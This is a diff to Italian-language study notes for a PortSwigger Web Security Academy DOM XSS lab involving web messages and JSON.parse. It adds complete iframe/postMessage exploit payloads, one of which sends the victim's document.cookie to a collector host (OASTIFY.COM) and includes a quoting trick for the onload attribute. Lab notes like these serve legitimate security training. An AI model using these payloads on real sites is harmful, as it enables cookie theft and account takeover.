@@ -120,20 +120,14 @@ git-cola --repo TARGET.web-security-academy.net/
 **3. DOM XSS using web messages and JSON.parse**
 
 - Segnale: l'event listener fa `JSON.parse(e.data)` prima di usare il risultato: si aspetta una proprietà `type`, e in un `switch` il case corrispondente (es. `"load-channel"`) assegna la proprietà `url` del messaggio al `src` di un iframe interno, senza controllare `e.origin` né validare lo schema dell'URL.
-- Soluzione: ospitare un iframe che carica la pagina vulnerabile e, al suo `onload`, invia un `postMessage` con la stringa JSON serializzata (`JSON.stringify`) sotto, che imposta `type` sul valore atteso dal `switch` e `url` su un payload `javascript:`, sfruttando l'assenza di controllo sull'origine e sullo schema per far eseguire il payload come `src` dell'iframe interno.
-- Payload (contenuto del messaggio):
-```json
-{
-    "type": "load-channel",
-    "url": "javascript:print()"
-}
+- Soluzione: ospitare un iframe che carica la pagina vulnerabile e, al suo `onload`, invia un `postMessage` con la stringa JSON (serializzata con `JSON.stringify`) che imposta `type` sul valore atteso dal `switch` e `url` su un payload `javascript:`, sfruttando l'assenza di controllo sull'origine e sullo schema per far eseguire il payload come `src` dell'iframe interno.
+- Payload:
+```html
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
-- Payload da esame (Burp Collaborator/OAST): esfiltra il cookie invece di chiamare `print()`.
-```json
-{
-    "type": "load-channel",
-    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
-}
+- Payload da esame (Burp Collaborator/OAST): esfiltra il cookie invece di chiamare `print()`; si usano i backtick (template literal) per il collector URL, così da non dover usare apici che romperebbero l'attributo `onload`.
+```html
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie\"}","*")'>
 ```
 - Link: [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
 - Step: 1
